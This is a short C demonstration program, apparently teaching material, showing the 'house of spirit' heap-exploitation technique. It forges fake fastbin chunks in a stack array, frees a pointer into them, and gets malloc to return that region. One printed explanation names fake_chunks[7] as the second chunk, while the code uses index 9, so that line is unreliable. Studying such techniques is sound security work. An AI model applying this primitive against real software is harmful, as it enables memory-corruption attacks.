#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("This file demonstrates the house of spirit attack.\n");

	printf("Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	printf("We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	printf("This region must contain two chunks. The first starts at %p and the second at %p.\n", &fake_chunks[1], &fake_chunks[7]);

	printf("This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size

	printf("The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av->system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .\n");
	fake_chunks[9] = 0x2240; // nextsize

	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2];

	printf("Freeing the overwritten pointer.\n");
	free(a);

	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	printf("malloc(0x30): %p\n", malloc(0x30));
}
